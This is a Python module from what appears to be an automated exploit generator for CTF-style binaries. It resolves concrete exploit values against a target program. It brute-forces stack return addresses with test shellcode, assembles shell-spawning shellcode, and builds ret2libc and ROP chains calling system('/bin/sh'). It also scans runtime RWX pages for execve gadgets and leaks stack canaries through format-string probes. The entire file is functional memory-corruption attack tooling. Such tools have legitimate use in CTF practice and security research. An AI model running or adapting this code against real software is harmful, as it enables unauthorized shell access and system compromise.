"""Active solvers: probe the binary to find concrete exploit values."""
from __future__ import annotations

import os
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from .config import Config
from .recon import ReconResult
from .strategy import Strategy


@dataclass
class SolveResult:
    strategy: str
    addresses: dict[str, int] = field(default_factory=dict)
    shellcode_hex: str = ""
    rop_chain: list[str] = field(default_factory=list)
    canary: int | None = None
    canary_pos: int | None = None
    payload_layout: str = ""
    notes: list[str] = field(default_factory=list)
    error: str = ""


# ---------------------------------------------------------------------------
# Runtime RWX page scanning
# ---------------------------------------------------------------------------

# Byte patterns for the i386 execve syscall gadgets.
# These cover the gadgets embedded in binaries that map their own RWX pages.
_EXECVE_GADGETS_I386: dict[str, bytes] = {
    "G_pop2":    b"\x58\x5b\xc3",   # pop eax; pop ebx; ret
    "G_pop_ebx": b"\x5b\xc3",        # pop ebx; ret
    "G_xor_eax": b"\x31\xc0\xc3",   # xor eax, eax; ret
    "G_store":   b"\x89\x03\xc3",   # mov [ebx], eax; ret
    "G_xor_ecx": b"\x31\xc9\xc3",   # xor ecx, ecx; ret
    "G_xor_edx": b"\x31\xd2\xc3",   # xor edx, edx; ret
    "G_mov_al":  b"\xb0\x0b\xc3",   # mov al, 0xb; ret
    "G_int80":   b"\xcd\x80\xc3",   # int 0x80; ret
}

_EXECVE_REQUIRED = frozenset(
    {"G_pop2", "G_xor_eax", "G_store", "G_xor_ecx", "G_xor_edx", "G_mov_al", "G_int80"}
)


def _read_rwx_pages(pid: int, out: list[tuple[int, bytes]]) -> None:
    """Append (start, data) for each non-stack rwx page in /proc/pid/maps."""
    try:
        maps_text = Path(f"/proc/{pid}/maps").read_text()
    except OSError:
        return
    try:
        mem_fd = open(f"/proc/{pid}/mem", "rb")
    except OSError:
        return
    try:
        for line in maps_text.splitlines():
            parts = line.split()
            if len(parts) < 2 or "rwx" not in parts[1]:
                continue
            tag = parts[-1] if len(parts) > 4 else ""
            if any(x in tag for x in ("[stack]", "[vvar]", "[vsyscall]", "[heap]")):
                continue
            lo, hi = (int(x, 16) for x in parts[0].split("-"))
            try:
                mem_fd.seek(lo)
                data = mem_fd.read(hi - lo)
                if data:
                    out.append((lo, data))
            except OSError:
                pass
    finally:
        mem_fd.close()


def scan_runtime_rwx_pages(
    binary: Path,
    input_mode: str,
    cfg: Config,
    verbose: bool = False,
) -> list[tuple[int, bytes]]:
    """Run the binary and return (start, data) for each rwx page it creates.

    For file-based modes a FIFO is used as the input path: the binary starts,
    performs any mmap/memcpy setup, then blocks at fopen() waiting for a
    writer — giving a stable window to snapshot /proc/pid/maps and read the
    page contents before the process exits.
    """
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)
    pages: list[tuple[int, bytes]] = []

    if input_mode in ("file-raw", "file-size-data"):
        fifo = Path(tempfile.mktemp(suffix=".rwx_probe"))
        os.mkfifo(str(fifo))
        try:
            proc = subprocess.Popen(
                wrapper + [str(binary), str(fifo)],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            # Give the binary time to initialise (mmap/memcpy), then block at fopen(fifo)
            time.sleep(0.4)
            _read_rwx_pages(proc.pid, pages)
            if verbose:
                print(f"    rwx scan: pid={proc.pid} found {len(pages)} page(s)")

            # Unblock the binary by connecting as writer
            def _write_fifo() -> None:
                try:
                    with open(str(fifo), "wb") as f:
                        if input_mode == "file-size-data":
                            f.write(b"4 AAAA\n")
                        else:
                            f.write(b"AAAA")
                except OSError:
                    pass

            t = threading.Thread(target=_write_fifo, daemon=True)
            t.start()
            proc.wait(timeout=5)
            t.join(timeout=2)
        except Exception as exc:
            if verbose:
                print(f"    rwx scan error: {exc}")
        finally:
            fifo.unlink(missing_ok=True)

    else:  # stdin — binary blocks on read, so we have all the time we need
        proc = subprocess.Popen(
            wrapper + [str(binary)],
            env=env,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(0.2)
        _read_rwx_pages(proc.pid, pages)
        try:
            proc.stdin.close()  # type: ignore[union-attr]
        except OSError:
            pass
        proc.wait(timeout=3)

    return pages


def find_execve_gadgets_i386(
    pages: list[tuple[int, bytes]],
) -> dict[str, int]:
    """Search rwx pages for i386 execve syscall gadgets.

    Returns a mapping of gadget name → absolute address.  Only searches for
    the gadgets needed to build a complete execve(0xb) chain.
    """
    found: dict[str, int] = {}
    for base, data in pages:
        for name, pattern in _EXECVE_GADGETS_I386.items():
            if name in found:
                continue
            idx = data.find(pattern)
            if idx != -1:
                found[name] = base + idx
    return found


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run_with_payload(
    binary: Path, input_mode: str, raw_payload: bytes, cfg: Config
) -> int:
    """Write payload (already framed for input_mode), run binary, return exit code."""
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)

    if input_mode == "file-size-data":
        framed = str(len(raw_payload)).encode() + b" " + raw_payload + b"\n"
    elif input_mode == "file-raw":
        framed = raw_payload
    else:
        framed = raw_payload + b"\n"

    if input_mode in ("file-raw", "file-size-data"):
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".inp", delete=False) as f:
            f.write(framed)
            tmp = Path(f.name)
        try:
            r = subprocess.run(
                wrapper + [str(binary), str(tmp)],
                capture_output=True, env=env, timeout=5,
            )
            return r.returncode
        except Exception:
            return -1
        finally:
            tmp.unlink(missing_ok=True)
    else:
        try:
            r = subprocess.run(
                wrapper + [str(binary)],
                input=framed, capture_output=True, env=env, timeout=5,
            )
            return r.returncode
        except Exception:
            return -1


def _run_and_capture(
    binary: Path, input_mode: str, raw_payload: bytes, cfg: Config
) -> tuple[int, str]:
    """Like _run_with_payload but also returns stdout+stderr."""
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)

    if input_mode == "file-size-data":
        framed = str(len(raw_payload)).encode() + b" " + raw_payload + b"\n"
    elif input_mode == "file-raw":
        framed = raw_payload
    else:
        framed = raw_payload + b"\n"

    if input_mode in ("file-raw", "file-size-data"):
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".inp", delete=False) as f:
            f.write(framed)
            tmp = Path(f.name)
        try:
            r = subprocess.run(
                wrapper + [str(binary), str(tmp)],
                capture_output=True, env=env, timeout=5,
            )
            out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            return r.returncode, out
        except Exception:
            return -1, ""
        finally:
            tmp.unlink(missing_ok=True)
    else:
        try:
            r = subprocess.run(
                wrapper + [str(binary)],
                input=framed, capture_output=True, env=env, timeout=5,
            )
            out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            return r.returncode, out
        except Exception:
            return -1, ""


# ---------------------------------------------------------------------------
# Strategy-specific solvers
# ---------------------------------------------------------------------------

def scan_shellcode_addr(
    binary: Path,
    offset: int,
    input_mode: str,
    cfg: Config,
    base_addr: int = 0xbfffe2e4,
    esp_at_crash: int = 0,
    verbose: bool = False,
) -> int | None:
    """Probe with exit(42) shellcode to find the real buffer start address.

    Strategy: place the shellcode at position 0 of the buffer (not at the end
    of a NOP sled), so we're scanning for the exact buffer start.  This avoids
    issues where the binary's own code overwrites bytes in the middle of the
    NOP sled region before the function returns.

    If esp_at_crash is provided (from GDB), the buffer start is
    esp_at_crash - offset - 4, which is used as the primary scan centre.
    A linear ±0x200 sweep with 4-byte steps covers the typical GDB/real-exec
    difference caused by environment-variable layout differences.
    """
    from pwn import asm, context, p32, shellcraft

    saved_arch, saved_log = context.arch, context.log_level
    context.arch = cfg.target.arch
    context.log_level = "error"
    try:
        test_sc = asm(shellcraft.exit(42))
        if offset <= len(test_sc):
            return None  # shellcode won't fit
        # Shellcode at position 0; filler fills the rest of the buffer before EIP.
        filler = asm("nop") * (offset - len(test_sc))

        # Derive primary centre from GDB's ESP register.
        if esp_at_crash:
            gdb_buf_start = esp_at_crash - offset - 4
            centers = [gdb_buf_start, base_addr]
        else:
            centers = [base_addr]

        seen: set[int] = set()
        # Fine-grained linear sweep: ±0x200 with 4-byte steps, then coarser fallback.
        fine_deltas = list(range(-0x200, 0x201, 4))
        coarse_deltas = [
            0x300, -0x300, 0x400, -0x400, 0x500, -0x500,
            0x600, -0x600, 0x800, -0x800,
        ]
        all_deltas = fine_deltas + coarse_deltas

        for center in centers:
            for delta in all_deltas:
                addr = center + delta
                if addr in seen or addr < 0x8000 or addr > 0xc0000000:
                    continue
                seen.add(addr)
                # payload: shellcode at byte-0, filler, then p32(addr) as return addr
                raw = test_sc + filler + p32(addr)
                rc = _run_with_payload(binary, input_mode, raw, cfg)
                if verbose:
                    mark = "  ✓" if rc == 42 else ""
                    print(f"    {hex(addr)}: exit={rc}{mark}")
                if rc == 42:
                    return addr
        return None
    finally:
        context.arch = saved_arch
        context.log_level = saved_log


def probe_canary_fmt(
    binary: Path,
    input_mode: str,
    cfg: Config,
    max_pos: int = 64,
    verbose: bool = False,
) -> tuple[int, int] | None:
    """Send %N$p probes to find format-string leak of stack canary.

    Returns (position, canary_value) or None.
    Canary heuristic: 4-byte value whose low byte is 0x00 and isn't all-zeros.
    """
    for pos in range(1, max_pos + 1):
        fmt = f"%{pos}$p".encode()
        rc, out = _run_and_capture(binary, input_mode, fmt, cfg)
        if verbose:
            print(f"    pos {pos:2d}: {out.strip()[:60]}")
        for token in out.split():
            tok = token.strip("(),\n\r")
            if tok.lower().startswith("0x"):
                try:
                    val = int(tok, 16)
                    # Canary: low byte 0x00, non-zero, fits in 32 bits
                    if (val & 0xff) == 0x00 and val != 0 and val < 0x100000000:
                        return pos, val
                except ValueError:
                    pass
    return None


def _rop_chain_items(r: ReconResult, cfg: Config) -> list[tuple[str, int]]:
    """Build a ROP chain and return [(description, address)]."""
    try:
        from pwn import ELF, ROP, context
        context.arch = cfg.target.arch
        context.log_level = "error"
        elf = ELF(str(r.binary), checksec=False)
        libc = ELF(r.libc_path, checksec=False) if r.libc_path else None

        sys_addr = r.plt.get("system") or r.functions.get("system")
        binsh_addr = r.strings_found.get("/bin/sh")

        if cfg.target.arch == "i386":
            if sys_addr and binsh_addr:
                return [
                    ("system@plt", sys_addr),
                    ("ret_after_system (dummy)", 0x41414141),
                    ("/bin/sh ptr", binsh_addr),
                ]
            if libc and sys_addr is None:
                return [
                    ("NOTE: needs libc base leak first", 0),
                    ("system (libc offset)", libc.symbols.get("system", 0)),
                    ("/bin/sh (libc offset)", next(libc.search(b"/bin/sh"), 0)),
                ]
        else:
            rop = ROP(elf)
            if sys_addr and binsh_addr:
                try:
                    pop_rdi = rop.rdi.address
                    return [
                        ("pop rdi; ret", pop_rdi),
                        ("/bin/sh ptr", binsh_addr),
                        ("system@plt", sys_addr),
                    ]
                except Exception:
                    pass
    except Exception:
        pass
    return []


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def solve(
    strat: Strategy,
    r: ReconResult,
    cfg: Config,
    verbose: bool = False,
    esp_at_crash: int = 0,
) -> SolveResult:
    """Actively probe the binary to resolve all exploit values."""
    res = SolveResult(strategy=strat.name)

    if strat.name == "shellcode":
        try:
            from pwn import asm, context, shellcraft
            context.arch = cfg.target.arch
            context.log_level = "error"
            shellcode = asm(shellcraft.sh())
        except Exception as e:
            res.error = f"pwntools error: {e}"
            return res

        res.shellcode_hex = shellcode.hex()

        if strat.offset is None:
            res.error = "offset unknown — run probe first"
            return res

        base = 0xbfffe2e4 if cfg.target.arch == "i386" else 0x7fffffffe000
        if verbose:
            print(f"  Scanning stack addresses (base={hex(base)}, esp_at_crash={hex(esp_at_crash)})...")
        addr = scan_shellcode_addr(
            r.binary, strat.offset, strat.input_mode, cfg,
            base_addr=base, esp_at_crash=esp_at_crash, verbose=verbose,
        )
        if addr:
            res.addresses["esp_at_overflow"] = addr
            nop_len = strat.offset - len(shellcode)
            total = strat.offset + 4
            res.payload_layout = (
                f"[{nop_len}x NOP] [{len(shellcode)}x shellcode] [p32({hex(addr)})]"
                f"  →  {total} bytes total"
            )
            res.notes.append(f"shellcode: {len(shellcode)} bytes  nop_sled: {nop_len} bytes")
        else:
            res.error = "address scan exhausted — adjust BASE_ADDR in exploit or re-run GDB probe"

    elif strat.name == "ret2libc":
        sys_addr = r.plt.get("system") or r.functions.get("system")
        binsh_addr = r.strings_found.get("/bin/sh")

        if sys_addr:
            res.addresses["system"] = sys_addr
        if binsh_addr:
            res.addresses["binsh"] = binsh_addr

        if sys_addr and binsh_addr and strat.offset is not None:
            total = strat.offset + 12
            res.payload_layout = (
                f"[{strat.offset}x 'A'] [p32({hex(sys_addr)})] "
                f"[p32(0x41414141)] [p32({hex(binsh_addr)})]"
                f"  →  {total} bytes total"
            )

        # system() not in PLT → libc base would be needed for a normal ret2libc.
        # Before giving up, scan the binary's runtime memory for RWX pages that
        # contain embedded ROP gadgets (a common CTF trick).
        if not sys_addr and cfg.target.arch == "i386":
            if verbose:
                print("  system() not in PLT — scanning runtime memory for rwx pages …")
            pages = scan_runtime_rwx_pages(r.binary, strat.input_mode, cfg, verbose=verbose)
            if pages:
                gadgets = find_execve_gadgets_i386(pages)
                if verbose:
                    print(f"  gadgets found: {list(gadgets.keys())}")
                if _EXECVE_REQUIRED.issubset(gadgets.keys()):
                    # Full execve chain available — switch strategy
                    rwx_base = pages[0][0]
                    binsh_ptr = rwx_base + 0x400  # writable buffer in same page
                    strat.name = "rop-rwx"
                    strat.addresses.update(gadgets)
                    strat.addresses["BINSH"] = binsh_ptr
                    res.addresses.update(gadgets)
                    res.addresses["BINSH"] = binsh_ptr
                    res.notes.append(
                        f"Found execve gadgets in rwx page @ {hex(rwx_base)} — "
                        "using ROP execve chain (no libc needed)"
                    )
                    if verbose:
                        print(f"  ✓ strategy upgraded to rop-rwx  (rwx base={hex(rwx_base)})")
                else:
                    missing = _EXECVE_REQUIRED - gadgets.keys()
                    res.notes.append(f"Partial rwx gadgets — missing: {sorted(missing)}")
            else:
                res.notes.append("No rwx pages found at runtime — libc leak required")
                res.notes.append("system() not in PLT — need libc base (see rop strategy)")

    elif strat.name == "rop":
        items = _rop_chain_items(r, cfg)
        if items:
            res.rop_chain = [f"{desc:<30} {hex(addr)}" for desc, addr in items if addr]
            for desc, addr in items:
                if addr and addr != 0x41414141:
                    res.addresses[desc.split()[0].rstrip(":")] = addr
        else:
            res.notes.append("Could not auto-build chain — check gadgets with: ROPgadget --binary <bin>")

    elif strat.name == "canary-fmt":
        if verbose:
            print("  Probing format string positions (this may take a moment)...")
        found = probe_canary_fmt(r.binary, strat.input_mode, cfg, verbose=verbose)
        if found:
            res.canary_pos, res.canary = found
        else:
            res.notes.append(
                "Canary not found via format string — binary may not echo output or "
                "format vuln uses a different input path"
            )

    elif strat.name == "canary-brute":
        res.notes.append("Brute-force canary: fork() detected — byte-by-byte attack viable")
        res.notes.append("Run the generated exploit script — brute() is implemented there")

    elif strat.name == "heap":
        res.notes.append("Heap exploitation requires manual GDB analysis")
        res.notes.append("Run: gdb ./binary  then: gef> heap chunks")

    return res


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def display(res: SolveResult) -> None:
    """Pretty-print a SolveResult."""
    W = 54
    print(f"\n{'━' * W}")
    print(f"  Strategy: {res.strategy}")
    print(f"{'━' * W}")

    if res.error:
        print(f"  ERROR: {res.error}")
        print(f"{'━' * W}")
        return

    if res.shellcode_hex:
        sc = bytes.fromhex(res.shellcode_hex)
        hex_rows = [res.shellcode_hex[i:i+32] for i in range(0, len(res.shellcode_hex), 32)]
        print(f"  Shellcode ({len(sc)} bytes):")
        for row in hex_rows:
            print("    " + " ".join(row[i:i+2] for i in range(0, len(row), 2)))

    if res.addresses:
        print(f"  Addresses:")
        for k, v in res.addresses.items():
            print(f"    {k:<28} {hex(v)}")

    if res.rop_chain:
        print(f"  ROP chain:")
        for item in res.rop_chain:
            print(f"    {item}")

    if res.canary is not None:
        print(f"  Canary position:  %{res.canary_pos}$p")
        print(f"  Canary value:     {hex(res.canary)}")

    if res.payload_layout:
        print(f"  Payload:")
        print(f"    {res.payload_layout}")

    for note in res.notes:
        print(f"  → {note}")

    print(f"{'━' * W}")
